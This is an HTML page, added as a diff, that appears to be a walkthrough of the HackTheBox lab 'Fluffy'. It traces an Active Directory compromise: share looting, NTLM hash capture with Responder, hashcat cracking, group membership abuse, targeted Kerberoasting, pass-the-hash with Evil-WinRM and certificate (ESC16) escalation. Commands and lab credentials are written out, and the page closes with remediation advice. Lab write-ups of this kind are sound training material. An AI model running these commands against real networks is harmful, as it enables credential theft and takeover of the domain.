@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HackTheBox - Fluffy</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            color: #2c3e50;
+        }
+        code, pre {
+            background-color: #eaeaea;
+            padding: 5px;
+            border-radius: 4px;
+            display: block;
+            white-space: pre-wrap;
+        }
+        img {
+            max-width: 100%;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .section {
+            background-color: #fff;
+            padding: 15px 20px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+        }
+        ul {
+            padding-left: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="section">
+<h1>Release Arena</h1>
+<p><strong>IP:</strong> 10.10.11.69</p>
+<img src="images/Pasted image 20250915181446.png" alt="Release Arena Screenshot">
+
+<h2>Autorecon</h2>
+<pre><code>autorecon -t ip.txt -vvv --ignore-plugin-checks</code></pre>
+
+<h2>NMAP</h2>
+<img src="images/Pasted image 20250915202202.png" alt="NMAP Scan">
+<ul>
+    <li>53,88,139,389,445,464,593,636, 5985 other LDAP ports and RPC ports</li>
+    <li>Definitely a Domain Controller</li>
+    <li><code>Domain: fluffy.htb</code> <code>DNS: DC01.fluffy.htb</code> → Add to <code>/etc/hosts</code></li>
+</ul>
+
+<h2>SMB (445)</h2>
+
+<h3>NXC with given creds</h3>
+<pre><code>j.fleischman / J0elTHEM4n1990!</code></pre>
+
+<pre><code></code>nxc smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares</code></pre>
+<img src="images/IT-share-fluffy.png" alt="NXC shares output">
+<p>Has read/write access to IT share.</p>
+
+<h3>smbclient</h3>
+<pre><code>smbclient -U 'j.fleischman' //10.10.11.69/IT</code></pre>
+<img src="images/Pasted image 20250915212201.png" alt="smbclient access">
+<p>Grab all files:</p>
+<pre><code>mget *</code></pre>
+<img src="images/Pasted image 20250915212310.png" alt="Downloading files">
+
+<h3>Testing initial access creds for WinRM</h3>
+<pre><code>nxc winrm fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!'</code></pre>
+<img src="images/Pasted image 20250915212929.png" alt="WinRM test failed">
+
+<h3>SMB Share Files</h3>
+
+<h4>KeePass Zip</h4>
+<img src="images/Pasted image 20250915212746.png" alt="KeePass zip contents">
+<p>Unzipped, not password-protected. Likely just the software download.</p>
+
+<h4>Exploit libraries</h4>
+<img src="images/Pasted image 20250915213218.png" alt="Exploit libraries">
+
+<h4>Upgrade_Notice.pdf</h4>
+<img src="images/Pasted image 20250915213343.png" alt="Upgrade notice vulnerabilities">
+<p>Contains a table of recent vulnerabilities. Another email found: <code>infrastructure@fluffy.htb</code></p>
+<img src="images/Pasted image 20250915213511.png" alt="Infrastructure email">
+<p>Admin maintenance notice.</p>
+
+<h4>Sample CVEs</h4>
+<ul>
+    <li><strong>CVE-2025-24996</strong> – External control of file name/path in NTLM → spoofing over network. <a href="https://cwe.mitre.org/data/definitions/73.html">Reference</a></li>
+    <li><strong>CVE-2025-21193</strong> – Active Directory Federation Server Spoofing</li>
+    <li><strong>CVE-2025-3445</strong> – Zip slip path traversal</li>
+</ul>
+<img src="images/Pasted image 20250915213711.png" alt="CVE-2025-24996">
+<img src="images/Pasted image 20250915214346.png" alt="CVE-2025-21193">
+
+<h3>Everything Zip & Executables</h3>
+<img src="images/Pasted image 20250915214636.png" alt="Everything zip">
+<img src="images/Pasted image 20250915214621.png" alt="Everything zip contents">
+<img src="images/Pasted image 20250915215539.png" alt="Share path">
+<p>Transferred <code>everything.exe</code> to Windows VM. File viewer in PE Bear shows version 1.4.1.1026.</p>
+<img src="images/Pasted image 20250916205310.png" alt="everything.exe in PE Bear">
+
+<h3>BloodHound Enumeration</h3>
+<pre><code>python3 bloodhound.py -ns 10.10.11.69 -d fluffy.htb -dc dc01.fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' -c All</code></pre>
+<img src="images/initial-bloodhound-fluffy.png" alt="BloodHound initial">
+<img src="images/Pasted image 20250918101753.png" alt="BloodHound upload">
+<img src="images/Pasted image 20250918102135.png" alt="BloodHound initial access user">
+<img src="images/Pasted image 20250918110933.png" alt="Domain users">
+
+<p>LDAP_SVC has generic write for WinRM and CA groups. If j.coffey's creds obtained → can access winrm_svc.</p>
+<img src="images/Pasted image 20250918111354.png" alt="LDAP_SVC permissions">
+<img src="images/Pasted image 20250918111513.png" alt="j.coffey access">
+
+<h3>Replacing executables / Reverse Shell</h3>
+<p>Attempted MSF reverse shell via <code>everything.exe</code>. Listener, upload, etc. Didn’t work.</p>
+<img src="images/Pasted image 20250918140540.png" alt="MSF reverse shell">
+<img src="images/Pasted image 20250918140634.png" alt="Uploaded rev shell">
+<img src="images/Pasted image 20250918143719.png" alt="Alternate exec attempt">
+
+<h3>Responder NTLM Relay</h3>
+<pre><code>sudo responder -I tun0</code></pre>
+<img src="images/Pasted image 20250918144426.png" alt="Responder setup">
+<img src="images/Pasted image 20250918144346.png" alt="Obtained p.agila hash">
+<pre><code>[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : ...</code></pre>
+<img src="images/Pasted image 20250918145928.png" alt="Hash file">
+
+<h3>Hashcat Cracking</h3>
+<pre><code>hashcat hash /usr/share/wordlists/rockyou.txt</code></pre>
+<p>Cracked: <code>prometheusx-303</code></p>
+<img src="images/Pasted image 20250918145857.png" alt="Hash cracked">
+
+<h3>Access Testing</h3>
+<pre><code>nxc smb fluffy.htb -u 'p.agila' -p 'prometheusx-303'</code></pre>
+<img src="images/Pasted image 20250918150221.png" alt="NXC login p.agila">
+<p>WinRM not remote user.</p>
+<img src="images/Pasted image 20250918150302.png" alt="WinRM test failed">
+
+<h3>BloodHound / Service Accounts</h3>
+<img src="images/Pasted image 20250918150426.png" alt="Peter service account manager">
+<img src="images/Pasted image 20250918150459.png" alt="Service accounts details">
+
+<pre><code>net rpc group addmem "Service Accounts" "p.agila" -U fluffy.htb/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"</code></pre>
+<img src="images/Pasted image 20250918152059.png" alt="Add p.agila to Service Accounts">
+
+<pre><code>net rpc group members "Service Accounts" -U fluffy.htb/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"</code></pre>
+<img src="images/Pasted image 20250918152245.png" alt="Verify group membership">
+
+<h3>PyWhisker</h3>
+<pre><code>pywhisker.py -d "fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "winrm_svc" --action "add"</code></pre>
+<img src="images/Pasted image 20250918152950.png" alt="PyWhisker attempt">
+
+<h3>Targeted Kerberoast</h3>
+<pre><code>python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303' --request-user 'winrm_svc'</code></pre>
+<img src="images/Pasted image 20250918153538.png" alt="Kerberoast successful">
+
+<p>WinRM_svc TGS captured. Attempted hashcat → failed. Using CVE exploits next.</p>
+
+<h3>Certipy / Shadow Credentials</h3>
+<img src="images/Pasted image 20250919163022.png" alt="Certipy vulnerable check">
+<img src="images/Pasted image 20250919170216.png" alt="Got NT hash for ca_svc">
+<img src="images/Pasted image 20250919170628.png" alt="Got NT hash & TGT for winrm_svc">
+
+<h3>Evil-WinRM</h3>
+<pre><code>evil-winrm -i 10.10.11.69 -H 33bd09dcd697600edf6b3a7af4875767 -u winrm_svc</code></pre>
+<img src="images/Pasted image 20250919171535.png" alt="Logged in winrm_svc">
+<img src="images/Pasted image 20250919171939.png" alt="User flag">
+
+<h3>Privilege Escalation</h3>
+<pre><code>whoami /all</code></pre>
+<img src="images/Pasted image 20250919172050.png" alt="Whoami all tokens">
+<img src="images/Pasted image 20250919172319.png" alt="Interesting users">
+<img src="images/Pasted image 20250919172606.png" alt="Uploaded winpeas.exe">
+<img src="images/Pasted image 20250919182520.png" alt="Run winpeas output">
+
+<h3>Certify / Vulnerable Certificates</h3>
+<img src="images/Pasted image 20250919183154.png" alt="Certify vulnerable check">
+<img src="images/Pasted image 20250919183233.png" alt="Certify re-run">
+<img src="images/Pasted image 20250919183903.png" alt="Cert Publishers group & CA_SVC">
+<img src="images/Pasted image 20250919184321.png" alt="Templates & CA_SVC hash">
+
+<h3>Whisker / Rubeus / TGT</h3>
+<img src="images/Pasted image 20250920141209.png" alt="Whisker ca_svc creds">
+<img src="images/Pasted image 20250920141440.png" alt="Rubeus TGT">
+<img src="images/Pasted image 20250920142256.png" alt="Process TGT base64">
+<img src="images/Pasted image 20250920142419.png" alt="Convert to .ccache">
+<img src="images/Pasted image 20250920153159.png" alt="Re-enumerate CA">
+<img src="images/Pasted image 20250920153405.png" alt="ESC16 vulnerable">
+<img src="images/Pasted image 20250920154116.png" alt="Initial UPN of victim">
+<img src="images/Pasted image 20250920154512.png" alt="Administrator UPN check">
+<img src="images/Pasted image 20250920154640.png" alt="Update UPN to administrator">
+<img src="images/Pasted image 20250920155111.png" alt="Request certificate via ESC16">
+<img src="images/Pasted image 20250920162735.png" alt="Revert victim UPN">
+<img src="images/Pasted image 20250920160312.png" alt="Authenticate as administrator.pfx">
+<img src="images/Pasted image 20250920162815.png" alt="Administrator hash obtained">
+<img src="images/Pasted image 20250920163004.png" alt="NXC login administrator">
+<img src="images/Pasted image 20250920163207.png" alt="Impacket psexec root">
+<img src="images/Pasted image 20250920163436.png" alt="Sharphound run">
+<img src="images/Pasted image 20250920163529.png" alt="Ca_SVC GenericAll over RootCA">
+
+<h2>Remediation Recommendations</h2>
+<ul>
+    <li>Enforce strong, unique passwords for all service accounts.</li>
+    <li>Limit LDAP/WinRM write permissions to strictly necessary users.</li>
+    <li>Monitor CA certificate requests and log anomalous enrollments.</li>
+    <li>Implement Kerberos ticket auditing to detect abnormal TGT requests.</li>
+    <li>Regularly rotate service account credentials and revoke unused accounts.</li>
+    <li>Apply principle of least privilege to administrative groups.</li>
+</ul>
+
+</div>
+
+</body>
+</html>
